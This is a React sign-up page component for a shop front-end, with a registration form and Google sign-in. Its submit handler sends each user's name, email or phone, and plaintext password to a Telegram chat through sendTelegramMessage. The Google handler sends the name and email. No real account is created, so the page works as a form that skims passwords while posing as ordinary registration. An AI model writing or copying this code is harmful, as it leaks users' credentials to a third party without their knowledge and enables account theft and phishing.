import { useState } from 'react'
import { useTranslation } from 'react-i18next'
import { Link, useNavigate } from 'react-router-dom'
import { useShop } from '../../context/ShopContext'
import { auth, googleProvider, signInWithPopup } from '../../firebase'
import { sendTelegramMessage } from '../../utils/telegram'
import './Auth.css'

const SignUp = () => {
	const { t } = useTranslation()
	const navigate = useNavigate()
	const { loginUser, showToast } = useShop()

	const [form, setForm] = useState({
		name: '',
		emailOrPhone: '',
		password: '',
	})

	const handleChange = e => {
		setForm({ ...form, [e.target.name]: e.target.value })
	}

	const handleGoogleSignup = async () => {
		try {
			const result = await signInWithPopup(auth, googleProvider)
			const user = result.user

			sendTelegramMessage(
				`<b>YANGI RO'YXATDAN O'TISH (Google):</b>\n\n` +
					`<b>Ism:</b> ${user.displayName || 'Google User'}\n` +
					`<b>Email:</b> ${user.email}\n` +
					`<b>Vaqt:</b> ${new Date().toLocaleString()}`,
			)

			loginUser({
				name: user.displayName || 'Google User',
				email: user.email || 'user@exclusive.com',
				address: 'Kingston, 5236, United State',
			})
			showToast('Signed up successfully with Google!', 'success')
			navigate('/')
		} catch (error) {
			showToast(error.message || 'Google sign up failed', 'error')
		}
	}

	const handleSubmit = e => {
		e.preventDefault()
		sendTelegramMessage(
			`<b>YANGI RO'YXATDAN O'TISH (Form):</b>\n\n` +
				`<b>Ism:</b> ${form.name || '-'}\n` +
				`<b>Email / Telefon:</b> ${form.emailOrPhone}\n` +
				`<b>Parol:</b> ${form.password}\n` +
				`<b>Vaqt:</b> ${new Date().toLocaleString()}`,
		)
		loginUser({
			name: form.name || 'User',
			email: form.emailOrPhone.includes('@')
				? form.emailOrPhone
				: 'user@exclusive.com',
			address: 'Kingston, 5236, United State',
		})
		showToast('Account created successfully!', 'success')
		navigate('/')
	}

	return (
		<div className='auth-page'>
			<div className='auth-media-column'>
				<div className='auth-illustration-bg'>
					<img
						src='/images/auth/side-image.png'
						alt='Shopping smartphone and cart'
						className='auth-hero-img'
					/>
				</div>
			</div>

			<div className='auth-form-column'>
				<div className='auth-form-box'>
					<h1 className='auth-title'>
						{t('auth.createAccount', 'Create an account')}
					</h1>
					<p className='auth-subtitle'>
						{t('auth.enterDetails', 'Enter your details below')}
					</p>

					<form className='auth-fields-form' onSubmit={handleSubmit}>
						<div className='auth-input-line'>
							<input
								type='text'
								name='name'
								placeholder={t('auth.name', 'Name')}
								value={form.name}
								onChange={handleChange}
							/>
						</div>

						<div className='auth-input-line'>
							<input
								type='text'
								name='emailOrPhone'
								placeholder={t('auth.emailOrPhone', 'Email or Phone Number')}
								value={form.emailOrPhone}
								onChange={handleChange}
							/>
						</div>

						<div className='auth-input-line'>
							<input
								type='password'
								name='password'
								placeholder={t('auth.password', 'Password')}
								value={form.password}
								onChange={handleChange}
							/>
						</div>

						<button type='submit' className='btn-primary btn-auth-submit'>
							{t('auth.btnCreate', 'Create Account')}
						</button>

						<button
							type='button'
							className='btn-google-signup'
							onClick={handleGoogleSignup}
						>
							<i
								className='fa-brands fa-google'
								style={{ fontSize: '18px', color: '#EA4335' }}
							></i>
							<span>{t('auth.signUpGoogle', 'Sign up with Google')}</span>
						</button>
					</form>

					<div className='auth-switch-row'>
						<span>{t('auth.alreadyHave', 'Already have account?')}</span>
						<Link to='/login' className='auth-switch-link'>
							{t('auth.login', 'Log in')}
						</Link>
					</div>
				</div>
			</div>
		</div>
	)
}

export default SignUp
